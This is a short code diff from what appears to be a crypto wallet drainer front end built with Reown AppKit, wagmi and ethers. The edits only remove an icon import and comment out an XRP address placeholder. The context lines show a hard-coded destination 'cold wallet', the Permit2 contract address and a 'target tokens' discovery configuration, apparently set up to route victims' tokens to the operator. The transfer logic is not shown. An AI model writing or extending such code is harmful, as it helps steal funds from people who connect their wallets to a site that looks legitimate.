@@ -13,7 +13,7 @@ import {
   useAppKitNetwork
 } from '@reown/appkit/react'
 import { BrowserProvider, Contract, formatUnits } from 'ethers'
-import { Droplets, Sparkles, ShieldCheck, ArrowRightLeft } from 'lucide-react' 
+import {Sparkles, ShieldCheck, ArrowRightLeft } from 'lucide-react' 
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -30,7 +30,7 @@ const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
 
 // 💰 SECURE DESTINATION WALLETS
 const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
-const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 
+// const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 
 
 // 💎 DISCOVERY CONFIGURATION
 const TARGET_TOKENS: Record<string, any> = {
